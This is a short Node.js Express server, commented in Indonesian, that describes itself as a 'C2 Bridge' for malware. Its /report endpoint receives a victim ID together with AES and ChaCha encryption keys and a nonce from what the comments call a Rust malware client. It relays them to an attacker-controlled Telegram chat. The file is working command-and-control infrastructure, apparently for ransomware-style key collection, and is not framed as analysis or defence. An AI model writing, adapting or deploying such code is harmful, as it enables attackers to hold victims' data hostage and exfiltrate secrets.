const express = require('express');
const axios = require('axios');
const app = express();

// Middleware untuk membaca JSON dari request body
app.use(express.json());

// Ambil konfigurasi dari Environment Variables (Settingan di Railway)
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Route Health Check (Biar tau server hidup)
app.get('/', (req, res) => {
    res.send('System Online. C2 Bridge is Active.');
});

// Route Utama: Menerima Laporan dan Kirim ke Telegram
app.post('/report', async (req, res) => {
    try {
        // 1. Ambil data yang dikirim oleh Malware/Cloudflare
        // Pastikan nama variabel ini SAMA dengan yang dikirim dari Rust (main.rs)
        const { id, aes, chacha, nonce } = req.body;

        if (!id || !aes) {
            return res.status(400).json({ status: 'error', message: 'Incomplete data' });
        }

        // 2. Format Pesan untuk Telegram (Markdown)
        const message = `
🔔 **INCOMING CONNECTION**

🆔 ID: \`${id}\`
🔑 AES: \`${aes}\`
🔑 ChaCha: \`${chacha}\`
🎲 Nonce: \`${nonce}\`
        `;

        // 3. Kirim ke API Telegram menggunakan Axios
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log(`[+] Report forwarded for ID: ${id}`);
        res.json({ status: 'success' });

    } catch (error) {
        console.error('[-] Error sending to Telegram:', error.message);
        res.status(500).json({ status: 'failed', error: error.message });
    }
});

// Jalankan Server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
